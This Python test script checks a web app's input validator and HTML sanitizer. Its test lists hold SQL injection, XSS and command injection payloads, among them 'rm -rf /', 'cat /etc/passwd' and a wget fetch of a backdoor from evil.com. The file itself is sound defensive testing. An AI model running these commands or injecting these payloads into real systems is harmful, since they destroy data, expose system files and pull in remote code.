#!/usr/bin/env python3
"""
Direct Security Test for MINGUS Assessment System
Tests core security components without Flask dependencies
"""

import sys
import os
import re
import json
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

# Add the backend directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'backend'))

# Mock Flask components for testing
class MockRequest:
    def __init__(self):
        self.remote_addr = "127.0.0.1"
        self.headers = {"User-Agent": "Test Browser"}
        self.user = {"id": "test-user"}

class MockCurrentApp:
    def __init__(self):
        self.db = None

# Mock the Flask components
import builtins
original_import = builtins.__import__

def mock_import(name, *args, **kwargs):
    if name == 'flask':
        class MockFlask:
            request = MockRequest()
            current_app = MockCurrentApp()
        return MockFlask()
    elif name == 'bleach':
        class MockBleach:
            @staticmethod
            def clean(text, tags=None, attributes=None):
                # Simple mock that removes script tags
                if '<script' in text:
                    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.IGNORECASE)
                return text
        return MockBleach()
    elif name == 'markupsafe':
        class MockMarkup:
            def __init__(self, text):
                self.text = text
            def __str__(self):
                return self.text
        return type('Markup', (), {'Markup': MockMarkup})()
    else:
        return original_import(name, *args, **kwargs)

builtins.__import__ = mock_import

# Now import our security components
from security.assessment_security import SecurityValidator, sanitize_assessment_content

def test_security_validator():
    """Test the SecurityValidator class"""
    print("🧪 Testing SecurityValidator...")
    
    validator = SecurityValidator()
    
    # Test SQL injection detection
    print("  Testing SQL injection detection...")
    sql_attacks = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1; SELECT * FROM users",
        "admin'--",
        "1' UNION SELECT password FROM users--"
    ]
    
    for attack in sql_attacks:
        result = validator.validate_input(attack, "test_field")
        if not result["valid"] and result["attack_type"] == "sql_injection":
            print(f"    ✅ SQL injection detected: {attack}")
        else:
            print(f"    ❌ SQL injection NOT detected: {attack}")
            return False
    
    # Test XSS detection
    print("  Testing XSS detection...")
    xss_attacks = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>"
    ]
    
    for attack in xss_attacks:
        result = validator.validate_input(attack, "test_field")
        if not result["valid"] and result["attack_type"] == "xss":
            print(f"    ✅ XSS detected: {attack}")
        else:
            print(f"    ❌ XSS NOT detected: {attack}")
            return False
    
    # Test command injection detection
    print("  Testing command injection detection...")
    cmd_attacks = [
        "cat /etc/passwd",
        "ls -la",
        "rm -rf /",
        "wget http://evil.com/backdoor",
        "python -c 'import os; os.system(\"rm -rf /\")'"
    ]
    
    for attack in cmd_attacks:
        result = validator.validate_input(attack, "test_field")
        if not result["valid"] and result["attack_type"] == "command_injection":
            print(f"    ✅ Command injection detected: {attack}")
        else:
            print(f"    ❌ Command injection NOT detected: {attack}")
            return False
    
    # Test valid input acceptance
    print("  Testing valid input acceptance...")
    valid_inputs = [
        "Software Engineer",
        "John Doe",
        "john.doe@example.com",
        "San Francisco, CA",
        "Technology",
        "I work in software development"
    ]
    
    for valid_input in valid_inputs:
        result = validator.validate_input(valid_input, "test_field")
        if result["valid"]:
            print(f"    ✅ Valid input accepted: {valid_input}")
        else:
            print(f"    ❌ Valid input rejected: {valid_input}")
            return False
    
    # Test email validation
    print("  Testing email validation...")
    valid_emails = ["test@example.com", "user.name@domain.co.uk"]
    invalid_emails = ["invalid-email", "@example.com", "user@"]
    
    for email in valid_emails:
        result = validator.validate_email(email)
        if result["valid"]:
            print(f"    ✅ Valid email accepted: {email}")
        else:
            print(f"    ❌ Valid email rejected: {email}")
            return False
    
    for email in invalid_emails:
        result = validator.validate_email(email)
        if not result["valid"]:
            print(f"    ✅ Invalid email rejected: {email}")
        else:
            print(f"    ❌ Invalid email accepted: {email}")
            return False
    
    # Test assessment data validation
    print("  Testing assessment data validation...")
    valid_data = {
        "responses": {
            "job_title": "Software Engineer",
            "field": "technology",
            "experience_level": "mid"
        },
        "email": "test@example.com",
        "first_name": "John"
    }
    
    result = validator.validate_assessment_data(valid_data)
    if result["valid"]:
        print(f"    ✅ Valid assessment data accepted")
    else:
        print(f"    ❌ Valid assessment data rejected")
        return False
    
    invalid_data = {
        "responses": {
            "job_title": "<script>alert('XSS')</script>",
            "field": "technology"
        }
    }
    
    result = validator.validate_assessment_data(invalid_data)
    if not result["valid"]:
        print(f"    ✅ Invalid assessment data rejected")
    else:
        print(f"    ❌ Invalid assessment data accepted")
        return False
    
    print("  ✅ All SecurityValidator tests passed!")
    return True

def test_content_sanitization():
    """Test content sanitization functions"""
    print("🧪 Testing content sanitization...")
    
    # Test XSS removal
    xss_content = "<script>alert('XSS')</script><h1>Safe Title</h1><p>Safe content</p>"
    sanitized = sanitize_assessment_content(xss_content)
    
    if "<script>" not in str(sanitized):
        print("    ✅ XSS script tag removed")
    else:
        print("    ❌ XSS script tag NOT removed")
        return False
    
    if "<h1>Safe Title</h1>" in str(sanitized):
        print("    ✅ Safe content preserved")
    else:
        print("    ❌ Safe content NOT preserved")
        return False
    
    # Test allowed tags preservation
    safe_content = "<h1>Title</h1><p>This is <strong>bold</strong> and <em>italic</em> text.</p>"
    sanitized = sanitize_assessment_content(safe_content)
    
    if "<h1>" in str(sanitized) and "<p>" in str(sanitized) and "<strong>" in str(sanitized) and "<em>" in str(sanitized):
        print("    ✅ Allowed tags preserved")
    else:
        print("    ❌ Allowed tags NOT preserved")
        return False
    
    print("  ✅ All content sanitization tests passed!")
    return True

def main():
    """Run all security tests"""
    print("🛡️ MINGUS Assessment Security System - Direct Test")
    print("=" * 60)
    
    # Test SecurityValidator
    if not test_security_validator():
        print("❌ SecurityValidator tests failed!")
        return False
    
    print()
    
    # Test content sanitization
    if not test_content_sanitization():
        print("❌ Content sanitization tests failed!")
        return False
    
    print()
    print("🎉 All security tests passed!")
    print("✅ The MINGUS Assessment Security System is working correctly!")
    
    return True

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
